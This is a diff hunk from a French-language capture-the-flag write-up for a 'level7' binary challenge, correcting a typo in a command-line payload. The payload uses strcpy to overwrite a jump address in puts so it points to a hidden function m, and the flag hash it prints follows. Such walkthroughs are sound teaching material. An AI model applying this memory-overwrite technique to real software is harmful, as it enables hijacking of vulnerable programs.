@@ -119,7 +119,7 @@ Comment acceder a cette fonction m ?
 En utilisant strcpy nous avons essayé d'ecrire a l'adresse 0x41414141 pour y mettre BBBB
 Essayons alors de prendre l'adresse du jmp present dans la fonction puts afin de la remplacer par l'adresse du debut de la fonction m :
 
-./level7 `python -c 'print "A"*20 + "\x28\x99\x04\x08"'` `python -c 'print "\xf4\x84\x04\08"'`
+./level7 `python -c 'print "A"*20 + "\x28\x99\x04\x08"'` `python -c 'print "\xf4\x84\x04\x08"'`
 5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
  - 1615986106
 
